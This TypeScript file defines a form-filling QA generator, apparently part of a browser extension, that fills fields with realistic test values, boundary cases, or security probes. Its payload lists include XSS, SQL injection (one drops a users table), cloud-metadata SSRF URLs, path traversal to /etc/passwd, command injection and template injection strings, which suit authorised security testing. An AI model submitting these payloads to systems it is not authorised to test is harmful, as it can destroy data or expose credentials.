import type { FormField } from '../content/scraper';

export type QAFlavor = 'all' | 'realistic' | 'boundary' | 'security' | 'appsec_pro';

export class QAGenerator {
  /**
   * Generates deterministic boundary, security fuzzing, and OWASP Top 10 payloads for form fields,
   * bypassing external LLM safety filters and guaranteeing exact boundary math.
   */
  static generateQAData(fields: FormField[], flavor: QAFlavor = 'all'): Record<string, string | boolean> {
    const result: Record<string, string | boolean> = {};

    const xssPayloads = [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "javascript:alert(1)",
      "<svg/onload=alert('XSS')>",
      "'\"><script>alert(document.cookie)</script>",
      "<iframe src=\"javascript:alert('XSS')\"></iframe>",
      "\" autofocus onfocus=\"alert(1)\""
    ];

    const sqliPayloads = [
      "' OR '1'='1",
      "1; DROP TABLE users; --",
      "admin'--",
      "' UNION SELECT NULL, NULL, NULL--",
      "1' OR 1=1--",
      "' AND (SELECT 1 FROM (SELECT SLEEP(5))A)--",
      "' OR pg_sleep(5)--",
      "1; WAITFOR DELAY '0:0:5'--"
    ];

    const ssrfPayloads = [
      "http://169.254.169.254/latest/meta-data/",
      "http://169.254.169.254/latest/user-data/",
      "http://127.0.0.1:80/admin",
      "http://metadata.google.internal/computeMetadata/v1/",
      "http://localhost:8080/metrics"
    ];

    const protoPollutionPayloads = [
      "__proto__[polluted]=true",
      "constructor.prototype.isAdmin=true",
      "{\"__proto__\":{\"polluted\":true}}",
      "__proto__.role=admin"
    ];

    const pathTraversalPayloads = [
      "../../../../../../../../etc/passwd",
      "..\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini",
      "file:///etc/hosts",
      "/etc/passwd\u0000.jpg"
    ];

    const cmdInjectionPayloads = [
      "$(whoami)",
      "; id;",
      "| ping -c 3 127.0.0.1",
      "& whoami",
      "`id`"
    ];

    const sstiPayloads = [
      "{{7*7}}",
      "${7*7}",
      "<%= 7*7 %>",
      "#{7*7}"
    ];

    const unicodePayloads = [
      "﷽",
      "🔥🚀🤖",
      "\u0000null",
      "𝓯𝓪𝓷𝓬𝔂 𝓽𝓮𝓯𝓽",
      "‏RTL_TEXT_תקן"
    ];

    fields.forEach((field, index) => {
      const fieldType = (field.type || 'text').toLowerCase();
      const labelLower = (field.label || field.placeholder || field.name || '').toLowerCase();
      const nameLower = (field.name || '').toLowerCase();

      // 1. Boolean / Selection fields
      if (fieldType === 'checkbox' || fieldType === 'radio') {
        result[field.id] = index % 2 === 0;
        return;
      }

      if (fieldType === 'select' && field.options && field.options.length > 0) {
        if (flavor === 'boundary') {
          // Pick last boundary option
          result[field.id] = field.options[field.options.length - 1];
        } else {
          // Pick middle or first valid option
          const targetIndex = Math.min(index + 1, field.options.length - 1);
          result[field.id] = field.options[targetIndex] || field.options[0];
        }
        return;
      }

      // 2. Realistic QA Test Mode (Clean deterministic pass)
      if (flavor === 'realistic') {
        if (labelLower.includes('first') && labelLower.includes('name')) {
          result[field.id] = "Alex";
          return;
        }
        if (labelLower.includes('last') && labelLower.includes('name')) {
          result[field.id] = "Vance";
          return;
        }
        if (labelLower.includes('name') || nameLower.includes('name')) {
          result[field.id] = "Alex Vance";
          return;
        }
        if (fieldType === 'email' || labelLower.includes('email')) {
          result[field.id] = "alex.vance.qa@testmail.org";
          return;
        }
        if (fieldType === 'tel' || labelLower.includes('phone') || labelLower.includes('mobile')) {
          result[field.id] = "+1 512-555-0142";
          return;
        }
        if (labelLower.includes('company') || labelLower.includes('organization')) {
          result[field.id] = "Vance Automation Labs";
          return;
        }
        if (labelLower.includes('title') || labelLower.includes('role') || labelLower.includes('position')) {
          result[field.id] = "Senior QA SDET Engineer";
          return;
        }
        if (labelLower.includes('street') || labelLower.includes('address')) {
          result[field.id] = "401 Congress Ave, Suite 1500";
          return;
        }
        if (labelLower.includes('city')) {
          result[field.id] = "Austin";
          return;
        }
        if (labelLower.includes('state') || labelLower.includes('province')) {
          result[field.id] = "Texas";
          return;
        }
        if (labelLower.includes('zip') || labelLower.includes('postal')) {
          result[field.id] = "78701";
          return;
        }
        if (labelLower.includes('country')) {
          result[field.id] = "United States";
          return;
        }
        if (fieldType === 'number' || fieldType === 'range') {
          const minNum = field.min ? parseFloat(field.min) : 1;
          const maxNum = field.max ? parseFloat(field.max) : 100;
          result[field.id] = String(Math.floor((minNum + maxNum) / 2));
          return;
        }
        if (fieldType === 'date') {
          result[field.id] = "2026-06-15";
          return;
        }
        if (fieldType === 'url' || labelLower.includes('url') || labelLower.includes('website')) {
          result[field.id] = "https://vance-labs.test";
          return;
        }
        result[field.id] = "Standard automated QA test run payload #104";
        return;
      }

      // 3. Security / AppSec Fuzzing Mode (Dedicated SQLi & XSS)
      if (flavor === 'security') {
        if (fieldType === 'email' || labelLower.includes('email')) {
          result[field.id] = "<script>alert(1)</script>@test.com";
          return;
        }
        if (fieldType === 'url' || labelLower.includes('url') || labelLower.includes('website')) {
          result[field.id] = "javascript:alert(1)";
          return;
        }
        if (fieldType === 'tel' || labelLower.includes('phone')) {
          result[field.id] = "' OR 1=1--";
          return;
        }
        // Alternate between SQLi and XSS payloads
        result[field.id] = index % 2 === 0
          ? xssPayloads[index % xssPayloads.length]
          : sqliPayloads[index % sqliPayloads.length];
        return;
      }

      // 3b. Advanced AppSec Penetration Suite (OWASP Top 10: Blind SQLi, SSRF, Prototype Pollution, LFI, RCE, SSTI)
      if (flavor === 'appsec_pro') {
        if (fieldType === 'email' || labelLower.includes('email')) {
          const appsecEmails = [
            "<script>alert('XSS')</script>@test.com",
            "\"admin@169.254.169.254\"@domain.com",
            "user+__proto__@security-test.org",
            "' OR '1'='1'--@test.com"
          ];
          result[field.id] = appsecEmails[index % appsecEmails.length];
          return;
        }
        if (fieldType === 'url' || labelLower.includes('url') || labelLower.includes('website')) {
          result[field.id] = ssrfPayloads[index % ssrfPayloads.length];
          return;
        }
        if (fieldType === 'tel' || labelLower.includes('phone')) {
          result[field.id] = sqliPayloads[index % sqliPayloads.length];
          return;
        }

        const appsecCategories = [
          sqliPayloads,
          xssPayloads,
          ssrfPayloads,
          protoPollutionPayloads,
          pathTraversalPayloads,
          cmdInjectionPayloads,
          sstiPayloads
        ];
        const category = appsecCategories[index % appsecCategories.length];
        result[field.id] = category[Math.floor(index / appsecCategories.length) % category.length];
        return;
      }

      // 4. Numeric / Inputmode Numeric fields (Boundary & All Modes)
      if (
        fieldType === 'number' ||
        fieldType === 'range' ||
        labelLower.includes('age') ||
        labelLower.includes('quantity') ||
        labelLower.includes('amount') ||
        labelLower.includes('count')
      ) {
        let val = -1; // Default underflow negative
        if (field.max !== undefined && field.max !== '') {
          const maxNum = parseFloat(field.max);
          val = isNaN(maxNum) ? 99999999 : maxNum + 1; // Boundary Overflow
        } else if (field.min !== undefined && field.min !== '') {
          const minNum = parseFloat(field.min);
          val = isNaN(minNum) ? -1 : minNum - 1; // Boundary Underflow
        } else {
          const numEdgeCases = [-99999, 0, 3.14159, 9007199254740991, -1];
          val = numEdgeCases[index % numEdgeCases.length];
        }
        result[field.id] = String(val);
        return;
      }

      // 5. Email fields (Boundary / All Modes)
      if (fieldType === 'email' || labelLower.includes('email')) {
        if (flavor === 'boundary') {
          // Maximum 64-character local part RFC 5321 limit
          result[field.id] = `${'a'.repeat(64)}@domain.com`;
          return;
        }
        const invalidEmails = [
          "invalid-email-address",
          "user@",
          "@domain.com",
          `user.${'a'.repeat(64)}@domain.com`,
          "<script>alert(1)</script>@test.com"
        ];
        result[field.id] = invalidEmails[index % invalidEmails.length];
        return;
      }

      // 6. Phone fields
      if (fieldType === 'tel' || labelLower.includes('phone') || labelLower.includes('mobile')) {
        const invalidPhones = [
          "+1000000000000000000000",
          "123",
          "abc-def-ghij",
          "(000) 000-0000",
          "+9999999999999999999"
        ];
        result[field.id] = invalidPhones[index % invalidPhones.length];
        return;
      }

      // 7. URL fields
      if (fieldType === 'url' || labelLower.includes('website') || labelLower.includes('url')) {
        const invalidUrls = [
          "ht`tp://invalid-domain",
          "javascript:alert(1)",
          "ftp://not-a-web-url",
          `https://${'a'.repeat(150)}.com`
        ];
        result[field.id] = invalidUrls[index % invalidUrls.length];
        return;
      }

      // 8. MaxLength Boundary Math (Exact Boundary Length Padding/Truncation)
      if (field.maxLength && field.maxLength > 0) {
        const max = field.maxLength;
        if (max <= 10) {
          result[field.id] = "A".repeat(max);
        } else {
          const payload = flavor === 'boundary' ? "B".repeat(max) : xssPayloads[index % xssPayloads.length];
          if (payload.length >= max) {
            result[field.id] = payload.slice(0, max);
          } else {
            result[field.id] = payload + "A".repeat(max - payload.length);
          }
        }
        return;
      }

      // 9. General Text & Textarea fields (Boundary / All Modes)
      if (flavor === 'boundary') {
        result[field.id] = "BOUNDARY_OVERFLOW_" + "X".repeat(500);
        return;
      }

      const edgeCaseType = index % 4;
      switch (edgeCaseType) {
        case 0:
          result[field.id] = xssPayloads[index % xssPayloads.length];
          break;
        case 1:
          result[field.id] = sqliPayloads[index % sqliPayloads.length];
          break;
        case 2:
          result[field.id] = unicodePayloads[index % unicodePayloads.length];
          break;
        case 3:
          result[field.id] = "OVERFLOW_" + "X".repeat(500);
          break;
      }
    });

    return result;
  }
}
